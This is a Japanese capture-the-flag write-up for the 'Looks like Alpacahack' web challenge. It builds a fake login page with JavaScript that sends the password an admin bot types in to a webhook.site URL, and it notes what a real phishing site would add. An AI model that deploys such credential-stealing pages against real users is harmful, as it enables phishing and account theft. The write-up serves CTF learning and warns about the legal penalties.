---
title: "Looks like Alpacahack - AlpacaHack Daily"
category: "rev"
subcategory: "wasm"
type: "writeup"
tags: ["rev", "alpacahack", "wasm", "headless-browser", "looks", "like"]
summary: "rev writeup for \"Looks like Alpacahack\" from AlpacaHack Daily - techniques: alpacahack, wasm, headless-browser, looks, like."
source:
  name: "baumroll0928-spec/myRepository"
  url: "https://github.com/baumroll0928-spec/myRepository/blob/a7f1cdb83e529deb9dad77ce670a12fc7209ab07/Daily_AlpacaHack/m202606/d17_Looks_like_Alpacahack/README.md"
ctf:
  name: "AlpacaHack Daily"
  year: 2026
  challenge: "Looks like Alpacahack"
---

## Source

- **CTF:** AlpacaHack Daily
- **Challenge:** Looks like Alpacahack
- **Date:** 2026-06-17
- **Repository:** [baumroll0928-spec/myRepository](https://github.com/baumroll0928-spec/myRepository)
- **Directory:** <https://github.com/baumroll0928-spec/myRepository/tree/a7f1cdb83e529deb9dad77ce670a12fc7209ab07/Daily_AlpacaHack/m202606/d17_Looks_like_Alpacahack>
- **File:** <https://github.com/baumroll0928-spec/myRepository/blob/a7f1cdb83e529deb9dad77ce670a12fc7209ab07/Daily_AlpacaHack/m202606/d17_Looks_like_Alpacahack/README.md>

---
# Looks like Alpacahack

## 問題

今日もAlpacaHackにログインするか...

```js
export const visit = async (url) => {
  console.log(`Start visiting: ${url}`);

  const browser = await puppeteer.launch({
    headless: "new",
    pipe: true,
    executablePath: "/usr/bin/chromium",
    args: [
      "--no-sandbox",
      "--disable-dev-shm-usage",
      "--disable-gpu",
      '--js-flags="--noexpose_wasm"',
    ],
  });

  try {
    const page = await browser.newPage();
    await page.goto(url, { timeout: 5000, waitUntil: "domcontentloaded" });

    // Checks "AlpacaHack" occurs in <title> tag.
    const title = await page.title();
    if (!title.includes("AlpacaHack")) {
      await page.close();
      return;
    }

    // Input username and password
    await page.type("input[name=email]", "alpaca@example.com");
    await page.type("input[name=password]", FLAG);

    await sleep(5000);
    await page.close();
  } catch (e) {
    console.error(e);
  }

  await browser.close();

  console.log(`End visiting: ${url}`);
};
```

## 概要

Admin Botは指定したURLにアクセスし、titleタグに`AlpacaHack`を含むことが確認できたら、`email`欄に`alpaca@example.com`を、`password`欄にフラグを入力するようです。

どうしたらこのフラグを得ることができるのでしょうか？

## 解法

この問題ではAdmin Botの他にRequestBinというサービスが用意されているようです。

これを使うと、自分で書いたHTMLからサクッとWebページを開くことができるみたいです。

詳しい仕組みはよくわかりませんが、せっかく用意されているので使わない手はないでしょう。

まず手始めに、[Webhook.site](https://webhook.site/)の自分専用のURLに飛ばすようなページを作ってみます。

```html
<!doctype html>
<html>
  <head>
    <meta charset="utf-8">
    <title>AlpacaHack</title>
  </head>
  <body>
    <h1>Hello from Requestbin</h1>
    <script>
      location.href="https://webhook.site/xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx?password="+"Alpaca{dummy_password}"
    </script>
  </body>
</html>
```

※サンプルページが用意されているので、これを編集すると楽です。

右上の「Save」をクリックすると右側に「GET /hello」ができるので、そこにある「Copy URL」をクリックします。

このURLにブラウザから直接アクセスしたり、Admin Botにアクセスさせたりすると、設定したダミーのパスワード`Alpaca{dummy_password}`が送られることを確認しました。

あとはAdmin Botが入力した本物のパスワードを送らせる方法を考えればよさそうです。

とりあえず入力欄がないと話が始まらないので、入力欄を設置してみます。

```html
    email: <input type="text" id="email" name="email"><br>
    password: <input type="password" id="password" name="password"><br>
```

ただ、送信ボタンを設置したところでAdmin Botはそれを押してくれませんが、どうすればいいでしょうか？

ここで私は5月30日の過去問「Slipboard」を思い出しました。

今回はテキストボックスの内容が変更されたときに発火するイベントを仕込めばいいので、

```html
  <body>
    <h1>AlpacaHack Login</h1>
    email: <input type="text" id="email" name="email"><br>
    password: <input type="password" id="password" name="password"><br>
    <script>
      const input_password = document.getElementById('password');
      input_password.addEventListener('change', () => {
        location.href="https://webhook.site/xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx?password="+input_password.value;
      });
    </script>
  </body>
```

こんな感じですかね。

ガチのフィッシングサイトだったら、画面遷移ではなく裏でこっそりリクエストを送るようにするとか、本物のAlpacaHackに投げ直す送信ボタンを設置するとか、見た目やURLを本物に似せるといった工夫が必要になると思いますが、CTF問題の解答なのでこれで十分でしょう。

この状態でRequestBinの自分専用ページにアクセスし、`email`と`password`にテキトーに入力すると、画面遷移が発生し、`password`の内容を送ることができました。

しかし、Admin Botに同じURLにアクセスさせると、なぜかWebhook.siteにリクエストが飛びません。

試しに`email`に変えたら飛ばすことができたので、おそらくですが最後に入力だけして確定（フォーカスアウト）していない`password`では`change`イベントが発火しないものと考えられます。

ならば、`change`イベントではなく入力があったときに発火する`input`イベントでしょうか。

```html
      input_password.addEventListener('input', () => {
```

今度はリクエストを飛ばすことができ、
```
password	Alpaca{REDACTED}
```
を得ることができました。

しかし、ローカル環境ではできたものの、本番環境で同じようにやってみると、

```
password	Al
```

のように、フラグの頭の部分しか送られていません。

おそらく入力の途中で送られてしまっているようです。

何かうまいやり方があるかもしれませんが、私には思いつかなかったので、方針を大きく変えることにします。

Admin Botはページを開いた後すぐに`email`と`password`を入力します。

ということは、ページを開いて1秒後には既に`password`が入力されているはずです。

よって、ページの読み込みが終わって1秒後に発動するようにイベントを仕込めば良いのではないでしょうか？

```html
  <body>
    <h1>AlpacaHack Login</h1>
    email: <input type="text" id="email" name="email"><br>
    password: <input type="password" id="password" name="password"><br>
    <script>
      window.addEventListener("load", () => {
        setTimeout(() => {
          const input_password = document.getElementById("password");
          location.href="https://webhook.site/xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx?password="+input_password.value;
        }, 1000);
      });
    </script>
  </body>
```

かなり雑ですが、CTF問題の（以下略）

この方法で、本番環境でも本物のパスワードを全て得ることができました。

## その他

今回の問題では、フィッシングサイト作成の疑似体験ができて、新鮮で面白かったですね。

ただ、実際に他人にこのようなことをしてしまうと、[不正アクセス禁止法](https://laws.e-gov.go.jp/law/411AC0000000128) 7条1項1号に抵触するおそれがあり、1年以下の拘禁刑又は50万円以下の罰金に処される可能性があります。（※2025年6月1日から懲役と禁錮が統合されて拘禁刑になりました。）

さらに、入手した他人のログイン情報を用いて実際に不正ログインを行った場合（3条違反）、もっと罪が重くなります。（3年以下の拘禁刑又は100万円以下の罰金）

犯罪目的ではもちろんのこと、たとえイタズラ等の目的であったとしても絶対にやらないでくださいね。（ローカル環境や許可されたCTF環境等のみで実験するようにしましょう。）
